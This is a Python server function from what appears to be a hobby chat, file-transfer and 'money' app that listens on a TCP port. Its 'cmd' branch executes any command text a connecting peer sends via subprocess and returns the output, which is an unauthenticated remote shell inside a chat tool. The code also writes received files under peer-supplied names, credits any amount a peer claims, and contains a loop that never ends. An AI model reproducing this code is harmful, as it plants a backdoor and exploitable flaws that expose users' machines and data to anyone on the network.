
def serveur():
    from modules import calc,conf_r,time,zlib,datetime,sqlite3,subprocess,sys,os,hashlib,base
    hosta,hostb,temp=base.ip_rd()
    temp=int(temp)
    inte=1
    port = 5566
    n=0
    tim4=0.0
    deb=0
    ps2=False
    ps3=0
    if inte==1:
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host1=socket.gethostname()
        host1=hosta
        sock.bind((host1,port))
    if n==0:
        print("your network address is : ",str(hosta))
        n+=1
    while inte:
        sock.listen()
        conn, adress =sock.accept()

        while inte:
            msg2=conn.recv(1024).decode("utf8")
            if msg2=="send":
                neu=1
                nou=0
                msg3=conn.recv(1024).decode("utf8")
                msg6 =conn.recv(1024).decode("utf8")
                print("your friend sends you the file => ",str(msg3))
                if deb==0:
                    seuc=input('press enter to validate !!! ')
                    if seuc=="":
                        seuc=5
                    else :
                        seuc=float(seuc)
                    deb+=1
                msg4="virtual/receved/"
                msg5=msg4+msg3
                fd =open(msg5,'wb')
                ft= open('virtual/system/temp','wb')
                print("compression recu est "+msg6)
                while neu:
                    tim1=time.time()
                    ft.write(conn.recv(1024))
                    tim2=time.time()
                    tim3=(tim2-tim1)
                    tim4+=tim3
                    if nou==0:
                        print("reception in progress")
                        nou+=1
                    if tim3>=seuc:
                        tim4=int(tim4)
                        ft.close()
                        neu=0
                        ft= open('virtual/system/temp','rb')
                        z_temp=ft.read()
                        ft.close()
                        z_fin=zlib.decompress(z_temp,wbits=0)
                        fd.write(z_fin)
                        fd.close()
                        os.remove('virtual/system/temp')
                        t_now=datetime.datetime.today()
                        forma_t="["+str(t_now.year)+'-'+str(t_now.month)+'-'+str(t_now.day)+'  '+str(t_now.hour)+':'+str(t_now.minute)+':'+str(t_now.second)+"] \t "+msg3+" \t succesfuly receved \n"
                        ft2= open('virtual/system/receved.history','a')
                        ft2.write(forma_t)
                        ft2.close()
                        print("receive {} end with a time of {} seconds  \n your message : ".format(msg3,tim4))
            elif msg2=="cmd":
                msg2=conn.recv(1024).decode("utf8")
                h=subprocess.getoutput(msg2)
                conn.send(str(h).encode("utf8"))
            elif msg2=="exit":
            	print('disconnection !!!')
            	time.sleep(1)
            	exit()
            elif msg2=='check':
                pass
            elif msg2=='sendall':
            	dec=conn.recv(1024).decode("utf8")
            	if dec=='end':
            		pass
            	else:
            		ps2=True
            	if ps2==True:
            		print('taille de la liste == ',dec)
            		lon=int(dec)
            		while ps3<lon:
            			
            			pass



            	ps2=False
            elif msg2=="money":
                mrecu=""
                mrecu=conn.recv(1024).decode("utf8")
                print("you just received {} money".format(mrecu))
                mrecu=int(mrecu)
                if mrecu !=0:
                    conn2=sqlite3.connect("virtual/system/base.db")
                    cur=conn2.cursor()
                    cur.execute("select money from info")
                    for l in cur:
                        liste_d=l
                    cur.execute("select pseudo from info")
                    for l in cur:
                        liste_s=l
                    cur.execute("select code from info")
                    for l in cur:
                        liste_n=l
                    cur.execute("select hache from info")
                    for l in cur:
                        liste_h=l
                    t2money=(liste_d[0])
                    snum=0
                    tb=1
                    while tb==1:
                        ts2=hashlib.sha224((bytes(str(snum),'utf8'))).hexdigest()
                        if ts2==t2money:
                            tb=0
                            t3money=snum
                        else:
                            snum+=1
                    nmoney=mrecu+t3money
                    hmoney=hashlib.sha224((bytes(str(nmoney),'utf8'))).hexdigest()
                    don2=(liste_s[0],liste_n[0],hmoney,liste_h[0])
                    cur.execute("insert into info (pseudo,code,money,hache) values(?,?,?,?)",don2)
                    conn2.commit()
                    cur.close()
                    conn2.close()
            else : 
                time.sleep(0.0)
                print("\n message from your friend: ",str(msg2))
